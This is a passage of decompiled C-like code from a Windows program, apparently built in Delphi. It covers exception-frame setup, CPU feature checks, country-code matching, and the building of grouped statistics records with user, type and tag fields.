  return result;
}
// 46EEAC: using guessed type char byte_46EEAC;
// 46EEB0: using guessed type _DWORD dword_46EEB0[506];

//----- (004516E0) --------------------------------------------------------
int __fastcall sub_4516E0(int a1, int a2, int a3, volatile __int32 *a4)
{
  int i; // ebx
  int v5; // esi
  int v7; // [esp-4h] [ebp-10h] BYREF

  for ( i = 2 * a3 + 1; i >= 0; v7 = v5 )
    v5 = *(_DWORD *)(a2 + 4 * i--);
  return sub_451730(a1, byte_46EEAC, a1, a3, (int)&v7, a4, a3);
}
// 46EEAC: using guessed type char byte_46EEAC;

//----- (00451730) --------------------------------------------------------
int __userpurge sub_451730@<eax>(
        unsigned __int8 a1@<al>,
        unsigned __int8 a2@<dl>,
        int a3@<ebx>,
        int a4@<edi>,
        int a5@<esi>,
        volatile __int32 *a6,
        int a7)
{
  unsigned int v8[3]; // [esp-24h] [ebp-38h] BYREF
  unsigned int v9[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v10; // [esp-10h] [ebp-24h]
  int v11; // [esp-Ch] [ebp-20h]
  int v12; // [esp-8h] [ebp-1Ch]
  int v13; // [esp-4h] [ebp-18h]
  int v14[3]; // [esp+0h] [ebp-14h] BYREF
  int v15; // [esp+Ch] [ebp-8h] BYREF
  __int16 v16; // [esp+10h] [ebp-4h]
  unsigned __int8 v17; // [esp+12h] [ebp-2h]
  unsigned __int8 v18; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  memset(v14, 0, sizeof(v14));
  v13 = a3;
  v12 = a5;
  v11 = a4;
  v17 = a2;
  v18 = a1;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_451877;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_406FE8(a6, dword_46EEB0[46 * a2 + a1]);
  if ( !*a6 )
    sub_451590(v18, v17, a6);
  if ( a7 + 1 > 0 )
  {
    v8[2] = (unsigned int)&savedregs;
    v8[1] = (unsigned int)&loc_4517D1;
    v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    sub_425B80((int)&v15);
    sub_406FE8(a6, v15);
    __writefsdword(0, v8[0]);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_45187E;
  return sub_406CA4((int)v14, 4);
}
// 451730: could not find valid save-restore pair for ebx
// 451730: could not find valid save-restore pair for edi
// 451730: could not find valid save-restore pair for esi
// 46EEB0: using guessed type _DWORD dword_46EEB0[506];

//----- (004518F0) --------------------------------------------------------
char __fastcall sub_4518F0(char result)
{
  byte_46EEAC = result;
  return result;
}
// 46EEAC: using guessed type char byte_46EEAC;

//----- (00451900) --------------------------------------------------------
int __fastcall sub_451900(int cchLength, _BYTE *a2)
{
  int v3; // eax
  char v4; // bl
  int *v5; // esi
  char v6; // zf
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  unsigned __int8 v10; // [esp+Fh] [ebp-5h]
  int v11; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4519B9;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v10 = 0;
  sub_426A60(cchLength, &v11);
  v3 = sub_407B7C((int)dword_4519D8, v11, 1);
  if ( v3 > 0 )
    sub_407B20(&v11, v3, 0x7FFFFFFF);
  v4 = 0;
  v5 = (int *)off_467F84;
  do
  {
    sub_407AA0(*v5, v11);
    if ( v6 )
    {
      *a2 = v4;
      v10 = 1;
      goto LABEL_11;
    }
    ++v4;
    ++v5;
  }
  while ( v4 != 11 );
  sub_407AA0(v11, (int)L"us");
  if ( v6 )
  {
    *a2 = 1;
    v10 = 1;
  }
  sub_407AA0(v11, (int)L"kr");
  if ( v6 )
  {
    *a2 = 9;
    v10 = 1;
  }
LABEL_11:
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4519C0;
  sub_406C44(&v11);
  return v10;
}
// 451964: variable 'v6' is possibly undefined
// 4519D8: using guessed type int dword_4519D8[4];
// 4519E8: using guessed type wchar_t aUs[3];
// 4519FC: using guessed type wchar_t aKr[3];
// 467F84: using guessed type wchar_t **off_467F84;

//----- (00451A10) --------------------------------------------------------
int sub_451A10()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_451A4C;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46EEA8 )
    sub_407E64(dword_46EEB0, &byte_40124C, 506);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40124C: using guessed type char byte_40124C;
// 46EEA8: using guessed type int dword_46EEA8;
// 46EEB0: using guessed type _DWORD dword_46EEB0[506];

//----- (00451A60) --------------------------------------------------------
void sub_451A60()
{
  ++dword_46F6A0;
}
// 46F6A0: using guessed type int dword_46F6A0;

//----- (00451A90) --------------------------------------------------------
int __fastcall sub_451A90(signed int *a1, int *a2)
{
  unsigned int v3; // [esp-18h] [ebp-28h]
  _DWORD v4[3]; // [esp-Ch] [ebp-1Ch] BYREF
  unsigned int v5; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+4h] [ebp-Ch] BYREF
  int *v7; // [esp+8h] [ebp-8h]
  signed int *v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v6 = 0;
  v5 = 0;
  v7 = a2;
  v8 = a1;
  v4[2] = &savedregs;
  v4[1] = &loc_451B01;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_415150(*((unsigned __int8 *)a1 + 4), &v6);
  sub_415150(*v8, (int *)&v5);
  v3 = v5;
  sub_4079F0(v7, 3);
  __writefsdword(0, v3);
  return sub_406CA4((int)&v5, 2);
}
// 451B10: using guessed type _strings str___6[1];

//----- (00451B20) --------------------------------------------------------
_DWORD *__fastcall sub_451B20(_DWORD *result)
{
  *result = dword_46F698;
  result[1] = dword_46F69C;
  return result;
}
// 46F698: using guessed type int dword_46F698;
// 46F69C: using guessed type int dword_46F69C;

//----- (00451B40) --------------------------------------------------------
int __fastcall sub_451B40(int result, int a2)
{
  if ( a2 <= result )
    return a2;
  return result;
}

//----- (00451BC8) --------------------------------------------------------
int sub_451BC8()
{
  int result; // eax

  _EAX = 1;
  __asm { cpuid }
  result = (_EDX & 0x2000000) != 0;
  if ( (_EDX & 0x4000000) != 0 )
    result |= 2u;
  if ( (_ECX & 1) != 0 )
    result |= 4u;
  if ( (_ECX & 0x200) != 0 )
    result |= 8u;
  if ( (_ECX & 0x80000) != 0 )
    result |= 0x10u;
  if ( (_ECX & 0x100000) != 0 )
    result |= 0x20u;
  if ( (_ECX & 0x800000) != 0 )
    result |= 0x40u;
  if ( (_ECX & 0x2000000) != 0 )
    result |= 0x40u;
  if ( (_ECX & 2) != 0 )
    return result | 0x100;
  return result;
}

//----- (00451C3C) --------------------------------------------------------
int *sub_451C3C()
{
  int *result; // eax

  result = off_4681F0[0];
  if ( *off_4681F0[0] )
  {
    result = (int *)sub_451BC8();
    *off_4681F0[0] = (int)result;
  }
  return result;
}
// 4681F0: using guessed type int *off_4681F0[2];

//----- (00451C54) --------------------------------------------------------
void sub_451C54()
{
  ++dword_46F6A4;
}
// 46F6A4: using guessed type int dword_46F6A4;

//----- (004521B0) --------------------------------------------------------
int __fastcall sub_4521B0(
        int *a1,
        signed int a2,
        __int32 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        BOOL *a9)
{
  _DWORD *v9; // eax
  unsigned int v11; // [esp-100h] [ebp-180h]
  void *v12; // [esp-F4h] [ebp-174h]
  const wchar_t *v13; // [esp-F0h] [ebp-170h]
  int v14; // [esp-ECh] [ebp-16Ch]
  void *v15; // [esp-E8h] [ebp-168h]
  const wchar_t *v16; // [esp-E4h] [ebp-164h]
  int v17; // [esp-E0h] [ebp-160h]
  void *v18; // [esp-DCh] [ebp-15Ch]
  const wchar_t *v19; // [esp-D8h] [ebp-158h]
  int v20; // [esp-D4h] [ebp-154h]
  void *v21; // [esp-D0h] [ebp-150h]
  const wchar_t *v22; // [esp-CCh] [ebp-14Ch]
  int v23; // [esp-C8h] [ebp-148h]
  void *v24; // [esp-C4h] [ebp-144h]
  _strings *v25; // [esp-C0h] [ebp-140h]
  int v26; // [esp-BCh] [ebp-13Ch]
  int v27; // [esp-B8h] [ebp-138h]
  int v28; // [esp-ACh] [ebp-12Ch]
  int v29; // [esp-A0h] [ebp-120h]
  int v30; // [esp-94h] [ebp-114h]
  int v31; // [esp-88h] [ebp-108h]
  int v32; // [esp-7Ch] [ebp-FCh]
  int v33; // [esp-74h] [ebp-F4h]
  int v34; // [esp-68h] [ebp-E8h]
  int v35; // [esp-5Ch] [ebp-DCh]
  int v36; // [esp-50h] [ebp-D0h]
  int v37; // [esp-38h] [ebp-B8h]
  int v38; // [esp-2Ch] [ebp-ACh]
  int v39; // [esp-20h] [ebp-A0h]
  _DWORD *v40; // [esp-14h] [ebp-94h]
  _DWORD *v41; // [esp-10h] [ebp-90h]
  _DWORD v42[4]; // [esp-Ch] [ebp-8Ch] BYREF
  void *v43[6]; // [esp+4h] [ebp-7Ch] BYREF
  int v44[5]; // [esp+1Ch] [ebp-64h] BYREF
  int v45; // [esp+30h] [ebp-50h] BYREF
  int v46; // [esp+34h] [ebp-4Ch] BYREF
  int v47; // [esp+38h] [ebp-48h] BYREF
  int v48; // [esp+3Ch] [ebp-44h] BYREF
  BOOL *v49; // [esp+40h] [ebp-40h] BYREF
  int v50; // [esp+44h] [ebp-3Ch] BYREF
  int v51; // [esp+48h] [ebp-38h] BYREF
  int v52; // [esp+4Ch] [ebp-34h] BYREF
  int v53; // [esp+50h] [ebp-30h] BYREF
  int v54; // [esp+54h] [ebp-2Ch] BYREF
  int v55; // [esp+58h] [ebp-28h] BYREF
  __int32 v56; // [esp+5Ch] [ebp-24h] BYREF
  __int32 v57; // [esp+60h] [ebp-20h] BYREF
  __int32 v58; // [esp+64h] [ebp-1Ch] BYREF
  signed int v59; // [esp+68h] [ebp-18h] BYREF
  __int32 v60; // [esp+6Ch] [ebp-14h] BYREF
  __int32 v61; // [esp+70h] [ebp-10h] BYREF
  int v62; // [esp+74h] [ebp-Ch]
  signed int v63; // [esp+78h] [ebp-8h]
  int *v64; // [esp+7Ch] [ebp-4h] BYREF
  int savedregs; // [esp+80h] [ebp+0h] BYREF

  v62 = _InterlockedExchange((volatile __int32 *)&v64, a3);
  v63 = a2;
  v64 = a1;
  v42[2] = &savedregs;
  v42[1] = &loc_452580;
  v42[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v42);
  v41 = sub_406C68(&v58);
  v40 = sub_406C68(&v57);
  v9 = sub_406C68(&v56);
  (*(void (__fastcall **)(int *, int, signed int *, _DWORD *, _DWORD *, _DWORD *))(*v64 + 12))(
    v64,
    v62,
    &v59,
    v41,
    v40,
    v9);
  sub_425AE0(*(unsigned __int8 *)(v62 + 4), &v54);
  v39 = v54;
  sub_425AE0(*(_DWORD *)v62, &v53);
  v38 = v53;
  sub_425AE0(v63, &v52);
  v37 = v52;
  sub_452B60(*v64, v57, (int)&v51);
  (*(void (__fastcall **)(int *, int, BOOL **, const char *, int, int *, const char *, int, int *, int *, int, int *, int *, int, int *, const char *))(*v64 + 16))(
    v64,
    v62,
    &v49,
    "gtype:",
    v39,
    dword_4525B0,
    "gdistr:",
    v38,
    dword_4525B0,
    dword_4525D4,
    v37,
    dword_4525B0,
    dword_4525E4,
    v51,
    dword_4525B0,
    "pers:");
  sub_452AF0(*v64, v49, &v50);
  v36 = v50;
  sub_425AE0(v59, &v48);
  v35 = v48;
  sub_452B60(*v64, v58, (int)&v47);
  v34 = v47;
  sub_452B60(*v64, v56, (int)&v46);
  v33 = v46;
  sub_4073B0(&v61, 23);
  sub_452AF0(*v64, a9, &v45);
  v32 = v45;
  unknown_libname_127(a4, HIDWORD(a4));
  v31 = v44[4];
  unknown_libname_127(a5, HIDWORD(a5));
  v30 = v44[3];
  unknown_libname_127(a6, HIDWORD(a6));
  v29 = v44[2];
  unknown_libname_127(a7, HIDWORD(a7));
  v28 = v44[1];
  unknown_libname_127(a8, HIDWORD(a8));
  v27 = v44[0];
  sub_4073B0(&v60, 17);
  Idexception::EIdException::EIdException(v60);
  sub_452920(v64);
  (*(void (__fastcall **)(int *, signed int, int *, int, int *, const char *, int, int *, const char *, int, int *, const char *, int, const char *, int, int *, const char *, int, int *, const char *, int, int *, const char *, int, int *, const char *, int, int *, const char *, int))(*v64 + 8))(
    v64,
    v63,
    &v55,
    v36,
    dword_4525B0,
    "uidtyp:",
    v35,
    dword_4525B0,
    "uid:",
    v34,
    dword_4525B0,
    "vid:",
    v33,
    "extinf:",
    v32,
    dword_4525B0,
    "tag:",
    v31,
    dword_4525B0,
    "tag2:",
    v30,
    dword_4525B0,
    "tag3:",
    v29,
    dword_4525B0,
    "tag4:",
    v28,
    dword_4525B0,
    "tag5:",
    v27);
  if ( a4 )
  {
    v26 = v55;
    v25 = &str___17[1];
    unknown_libname_75(a4, HIDWORD(a4));
    v24 = v43[5];
    sub_4079F0(&v55, 3);
  }
  if ( a5 )
  {
    v23 = v55;
    v22 = L" tag2=";
    unknown_libname_75(a5, HIDWORD(a5));
    v21 = v43[4];
    sub_4079F0(&v55, 3);
  }
  if ( a6 )
  {
    v20 = v55;
    v19 = L" tag3=";
    unknown_libname_75(a6, HIDWORD(a6));
    v18 = v43[3];
    sub_4079F0(&v55, 3);
  }
  if ( a7 )
  {
    v17 = v55;
    v16 = L" tag4=";
    unknown_libname_75(a7, HIDWORD(a7));
    v15 = v43[2];
    sub_4079F0(&v55, 3);
  }
  if ( a8 )
  {
    v14 = v55;
    v13 = L" tag5=";
    unknown_libname_75(a8, HIDWORD(a8));
    v12 = v43[1];
    sub_4079F0(&v55, 3);
  }
  sub_407910(&v55, &str___17[1]._top);
  (*(void (__fastcall **)(int *, int, void **, int, _strings *, void *, int, const wchar_t *, void *, int, const wchar_t *, void *, int, const wchar_t *, void *, int, const wchar_t *, void *))(*v64 + 4))(
    v64,
    v62,
    v43,
    v26,
    v25,
    v24,
    v23,
    v22,
    v21,
    v20,
    v19,
    v18,
    v17,
    v16,
    v15,
    v14,
    v13,
    v12);
  sub_407910(&v55, (_DWORD *)v43[0]);
  if ( a9 )
  {
    v11 = (unsigned int)a9;
    sub_4079F0(&v55, 3);
  }
  sub_433BE0(*off_467F18, v55, 0);
  __writefsdword(0, v11);
  sub_406CA4((int)v43, 6);
  sub_406CD4((int)v44, 9);
  sub_406C44(&v49);
  sub_406CD4((int)&v50, 5);
  sub_406C44(&v55);
  sub_406CD4((int)&v56, 3);
  return sub_406CD4((int)&v60, 2);
}
// 4524E4: variable 'v26' is possibly undefined
// 4524E4: variable 'v25' is possibly undefined
// 4524E4: variable 'v24' is possibly undefined
// 4524E4: variable 'v23' is possibly undefined
// 4524E4: variable 'v22' is possibly undefined
// 4524E4: variable 'v21' is possibly undefined
// 4524E4: variable 'v20' is possibly undefined
// 4524E4: variable 'v19' is possibly undefined
// 4524E4: variable 'v18' is possibly undefined
// 4524E4: variable 'v17' is possibly undefined
// 4524E4: variable 'v16' is possibly undefined
// 4524E4: variable 'v15' is possibly undefined
// 4524E4: variable 'v14' is possibly undefined
// 4524E4: variable 'v13' is possibly undefined
// 4524E4: variable 'v12' is possibly undefined
// 452526: variable 'v11' is possibly undefined
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 425B60: using guessed type _DWORD __stdcall unknown_libname_127(_DWORD, _DWORD);
// 4525B0: using guessed type int dword_4525B0[4];
// 4525D4: using guessed type int dword_4525D4[4];
// 4525E4: using guessed type int dword_4525E4[4];
// 4526B4: using guessed type _strings str___17[1];
// 4526CC: using guessed type wchar_t aTag2_0[7];
// 4526E8: using guessed type wchar_t aTag3_0[7];
// 452704: using guessed type wchar_t aTag4_0[7];
// 452720: using guessed type wchar_t aTag5_0[7];
// 452920: using guessed type int __fastcall sub_452920(_DWORD);
// 453A80: using guessed type _DWORD __stdcall Idexception::EIdException::EIdException(_DWORD);
// 467F18: using guessed type int *off_467F18;

//----- (00452730) --------------------------------------------------------
_DWORD *__usercall sub_452730@<eax>(int *a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  _DWORD *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // edx
  unsigned int v12; // [esp-28h] [ebp-54h]
  struct _EXCEPTION_REGISTRATION_RECORD *v13; // [esp-14h] [ebp-40h] BYREF
  _DWORD *v14; // [esp-10h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v16; // [esp-8h] [ebp-34h]
  int *v17; // [esp-4h] [ebp-30h]
  void *v18; // [esp+0h] [ebp-2Ch]
  unsigned int v19; // [esp+4h] [ebp-28h] BYREF
  int v20; // [esp+8h] [ebp-24h] BYREF
  int v21; // [esp+Ch] [ebp-20h]
  int v22; // [esp+10h] [ebp-1Ch] BYREF
  int v23; // [esp+14h] [ebp-18h] BYREF
  __int32 v24; // [esp+18h] [ebp-14h] BYREF
  signed int v25; // [esp+1Ch] [ebp-10h] BYREF
  __int32 v26; // [esp+20h] [ebp-Ch] BYREF
  int v27; // [esp+24h] [ebp-8h]
  int *v28; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v28 = a1;
  v17 = &savedregs;
  v16 = &loc_4528CE;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v14 = sub_406C68(&v24);
  v13 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_406C68(&v23);
  v3 = sub_406C68(&v22);
  v4 = *v28;
  (*(void (__fastcall **)(int *, int *, signed int *, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD *, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD *))(*v28 + 12))(
    v28,
    off_468030[0],
    &v25,
    ExceptionList,
    v14,
    v13,
    v3);
  sub_4285F0((int (__fastcall ***)(_DWORD))v28[4]);
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v14 = &loc_452897;
  v13 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v13);
  v5 = sub_40867C(v28[5]);
  if ( v5 >= 0 )
  {
    v21 = v5 + 1;
    v27 = 0;
    do
    {
      v6 = *(_DWORD *)(v28[5] + 4 * v27);
      if ( ((*(int (__fastcall **)(int))(*(_DWORD *)v6 + 20))(v6) & 2) != 0 )
        goto LABEL_4;
      ++v27;
    }
    while ( --v21 );
  }
  v7 = sub_40867C(v28[6]);
  if ( v7 >= 0 )
  {
    v21 = v7 + 1;
    v27 = 0;
    while ( 1 )
    {
      v8 = *(_DWORD *)(v28[6] + 4 * v27);
      if ( ((*(int (__fastcall **)(int))(*(_DWORD *)v8 + 20))(v8) & 2) != 0 )
        break;
      ++v27;
      if ( !--v21 )
        goto LABEL_10;
    }
LABEL_4:
    System::__linkproc__ TryFinallyExit(v13, v14, ExceptionList);
    goto LABEL_13;
  }
LABEL_10:
  sub_425AE0(v25, &v20);
  sub_452B60(*v28, v24, (int)&v19);
  v12 = v19;
  sub_4073B0(&v26, 5);
  v9 = (_DWORD *)sub_4538E0(3, v26);
  v10 = v9;
  if ( v9 )
    v10 = v9 + 5;
  sub_452920(v28, v10, v4, a2, a3);
  __writefsdword(0, v12);
  sub_428600(v28[4]);
LABEL_13:
  __writefsdword(0, (unsigned int)v16);
  v18 = &loc_4528D5;
  sub_406CD4((int)&v19, 2);
  sub_406CD4((int)&v22, 3);
  return sub_406C68(&v26);
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4538E0: using guessed type _DWORD __stdcall sub_4538E0(char, _DWORD);
// 468030: using guessed type int *off_468030[2];

//----- (00452920) --------------------------------------------------------
int __usercall sub_452920@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  void *v5; // eax
  int v6; // eax
  char v7; // al
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-18h] [ebp-24h] BYREF
  void *v10; // [esp-14h] [ebp-20h]
  int *v11; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v13; // [esp-8h] [ebp-14h]
  int *v14; // [esp-4h] [ebp-10h]
  void *i; // [esp+0h] [ebp-Ch]
  _DWORD *v16; // [esp+4h] [ebp-8h] BYREF
  int *v17; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v16 = a2;
  v17 = a1;
  unknown_libname_60(a2);
  v14 = &savedregs;
  v13 = &loc_452A8F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  *((_BYTE *)v17 + 4) = 1;
  sub_4285F0((int (__fastcall ***)(_DWORD))v17[4]);
  v11 = &savedregs;
  v10 = &loc_452A72;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  if ( ((*(int (__fastcall **)(_DWORD *, _DWORD))(*v16 + 20))(v16, *v16) & 4) == 0 )
  {
    if ( System::__linkproc__ LStrLen(v17[6]) >= 2000 )
    {
      v7 = (*(int (__fastcall **)(_DWORD *))(*v16 + 16))(v16);
      sub_4521B0(v17, 999, (__int32)off_468030[0], v7, 0i64, 0i64, 0i64, 0i64, 0);
      System::__linkproc__ TryFinallyExit(v10, v11, ExceptionList);
      goto LABEL_16;
    }
    Idglobal::AppendBytes(v17 + 6, v16);
LABEL_15:
    __writefsdword(0, (unsigned int)v10);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_452A79;
    sub_428600(v17[4]);
    goto LABEL_16;
  }
  v5 = (void *)sub_40867C(v17[5]);
  if ( (int)v5 >= 0 )
  {
    for ( i = v5; i != (void *)-1; i = (char *)i - 1 )
    {
      v6 = *(_DWORD *)(v17[5] + 4 * (_DWORD)i);
      if ( (*(unsigned __int8 (__fastcall **)(int, _DWORD *))(*(_DWORD *)v6 + 24))(v6, v16) )
        goto LABEL_5;
    }
  }
  if ( System::__linkproc__ LStrLen(v17[5]) < 1000 )
  {
    Idglobal::AppendBytes(v17 + 5, v16);
    goto LABEL_15;
  }
  if ( !*((_BYTE *)v17 + 48) )
  {
    *((_BYTE *)v17 + 48) = 1;
    sub_4338D0(*off_467F18, (unsigned int)L"Too many GC statistic grouped items", 0, a3, a4, a5);
  }
LABEL_5:
  System::__linkproc__ TryFinallyExit(v10, v11, ExceptionList);
LABEL_16:
  __writefsdword(0, (unsigned int)v13);
  i = &loc_452A96;
  return System::__linkproc__ IntfClear(&v16);
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A0C0: using guessed type int __fastcall unknown_libname_60(_DWORD);
// 452AA8: using guessed type wchar_t aTooManyGcStati[36];
// 453860: using guessed type int __fastcall Idglobal::AppendBytes(_DWORD, _DWORD);
// 467F18: using guessed type int *off_467F18;
// 468030: using guessed type int *off_468030[2];

//----- (00452AF0) --------------------------------------------------------
_DWORD *__fastcall sub_452AF0(int a1, BOOL *a2, _DWORD *a3)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v5; // [esp-4h] [ebp-18h]
  __int32 v6; // [esp+4h] [ebp-10h] BYREF
  _DWORD *v7; // [esp+8h] [ebp-Ch]
  BOOL *v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = 0;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_452B52;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( a2 )
  {
    sub_40B238(v8, &v6);
    sub_452B60(v9, v6, (int)v7);
  }
  else
  {
    sub_406C68(v7);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_452B59;
  return sub_406C68(&v6);
}

//----- (00452B60) --------------------------------------------------------
_DWORD *__fastcall sub_452B60(int a1, __int32 a2, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v9; // [esp-4h] [ebp-24h]
  __int32 v10; // [esp+4h] [ebp-1Ch] BYREF
  int v11; // [esp+8h] [ebp-18h]
  int v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  __int32 v15; // [esp+18h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v10 = 0;
  v14 = a3;
  v15 = a2;
  v16 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_452C80;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( a2 )
  {
    sub_407084((volatile __int32 *)v14, v15);
    sub_423F10(*(_DWORD *)v14, (__int32)sub_452CA8, (int)dword_452C98, &v10);
    sub_407084((volatile __int32 *)v14, v10);
    v12 = 0;
    v3 = System::__linkproc__ LStrLen(*(_DWORD *)v14);
    if ( v3 > 0 )
    {
      v11 = v3;
      v13 = 1;
      do
      {
        if ( v12 > 0 )
        {
          v4 = sub_4071C8(v14);
          *(_BYTE *)(v4 + v13 - v12 - 1) = *(_BYTE *)(*(_DWORD *)v14 + v13 - 1);
        }
        if ( (unsigned __int8)(*(_BYTE *)(*(_DWORD *)v14 + v13 - 1) - 9) < 2u
          || *(_BYTE *)(*(_DWORD *)v14 + v13 - 1) == 13 )
        {
          v5 = sub_4071C8(v14);
          *(_BYTE *)(v5 + v13 - v12 - 1) = 124;
        }
        else if ( *(_BYTE *)(*(_DWORD *)v14 + v13 - 1) < 0x20u )
        {
          ++v12;
        }
        ++v13;
        --v11;
      }
      while ( v11 );
    }
    if ( v12 > 0 )
    {
      v6 = System::__linkproc__ LStrLen(*(_DWORD *)v14);
      sub_4075BC((_DWORD *)v14, v6 - v12, 0);
    }
  }
  else
  {
    sub_406C68((_DWORD *)v14);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_452C87;
  return sub_406C68(&v10);
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 452C98: using guessed type int dword_452C98[4];
// 452CA8: using guessed type int sub_452CA8();

//----- (00452CB0) --------------------------------------------------------
int __usercall sub_452CB0@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // eax
  __int64 v7; // [esp+0h] [ebp-10h] BYREF
  char v8; // [esp+Bh] [ebp-5h]
  int v9; // [esp+Ch] [ebp-4h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v8 = a2;
  v9 = a1;
  sub_405568(a1, 0);
  *(_DWORD *)(v9 + 16) = sub_428540((int)cls_CrossPlatform_TCriticalSection, 1);
  *(_QWORD *)(v9 + 40) = ((__int64 (__fastcall *)(int))*(_DWORD *)(*(_DWORD *)v9 + 20))(v9);
  sub_423830(&v7);
  *(_QWORD *)(v9 + 56) = v7;
  *(_DWORD *)(v9 + 8) = -3;
  *(_DWORD *)(v9 + 28) = 1;
  v5 = sub_438970(a3, a4, a5);
  *(_DWORD *)(v9 + 52) = v5;
  if ( v8 )
    System::__linkproc__ AfterConstruction(v9);
  return v9;
}
// 452CC2: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4231F0: using guessed type int (*cls_CrossPlatform_TCriticalSection[3])();

//----- (00452D50) --------------------------------------------------------
int sub_452D50()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  unknown_libname_94(v0 + 16);
  unknown_libname_94(v3 + 52);
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00452DA0) --------------------------------------------------------
__int64 sub_452DA0()
{
  return 2000i64;
}

//----- (00452DD0) --------------------------------------------------------
__int64 sub_452DD0()
{
  return 150000i64;
}

//----- (00452E00) --------------------------------------------------------
int __fastcall sub_452E00(_QWORD *a1)
{
